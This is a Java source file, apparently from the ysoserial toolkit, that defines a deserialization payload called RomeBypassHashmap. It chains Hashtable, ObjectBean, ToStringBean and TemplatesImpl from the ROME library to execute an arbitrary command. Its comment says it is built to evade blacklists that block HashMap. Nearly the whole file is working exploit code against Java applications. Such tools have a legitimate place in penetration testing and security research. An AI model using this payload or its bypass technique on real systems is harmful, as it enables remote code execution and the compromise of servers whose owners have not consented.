package ysoserial.payloads;

import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import org.python.modules._hashlib;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

import javax.xml.transform.Templates;
import java.util.Hashtable;

/*
For ByPass "Hashmap" in blacklist
Hashtable#readobject()
ObjectBean#hascode()
EqualsBean#hashcode()
ToStringBean#toString()
TemplatesImpl#getProperties()
....
TemplatesImpl#defineclass()
*/
@Dependencies("rome:rome:1.0")
@Authors({ Authors.F4NX1NG })
public class RomeBypassHashmap implements ObjectPayload<Object>{
    public Object getObject ( String command ) throws Exception {
        Object o = Gadgets.createTemplatesImpl(command);
        ToStringBean delegate = new ToStringBean(Templates.class, o);
        ObjectBean root  = new ObjectBean(ToStringBean.class, delegate);
        return Gadgets.makeTable(root, root);
    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(RomeBypassHashmap.class, args);
    }
}
